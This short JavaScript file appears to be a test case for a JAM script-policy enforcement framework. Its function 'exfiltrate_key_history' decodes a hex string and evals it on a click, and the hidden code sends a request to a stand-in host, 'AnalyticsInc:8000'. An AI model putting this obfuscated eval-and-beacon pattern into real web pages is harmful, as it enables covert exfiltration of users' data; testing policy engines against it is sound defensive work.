function exfiltrate_key_history() {
  var exp = "786d6c687474703d6e657720584d4c487474705265717565737428293b0a786d6c687474702e6f70656e2822474554222c2022687474703a2f2f416e616c7974696373496e633a383030302f7375626d697373696f6e2e68746d6c3f746573743d686578222c2074727565293b0a786d6c687474702e73656e64286e756c6c293b";
  var dec = "";
  var i$$1 = 0;
  var v2 = exp.length;
  var v0 = i$$1 < v2;
  for (;v0;) {
    var v6 = JAM.call(exp.substr, exp, [i$$1, 2], JAM.policy.p1);
    var v5 = parseInt(v6, 16);
    var v3 = String.fromCharCode(v5);
    dec = dec + v3;
    i$$1 = i$$1 + 2;
    var v4 = exp.length;
    v0 = i$$1 < v4;
  }
  if (JAM.isEval(eval)) {
    eval("introspect(JAM.policy.pFull) { " + dec + " }");
  } else {
    JAM.call(eval, null, [dec]);
  }
  return;
}
var v1 = document.getElementById("test");
JAM.set(v1, "onclick", exfiltrate_key_history)
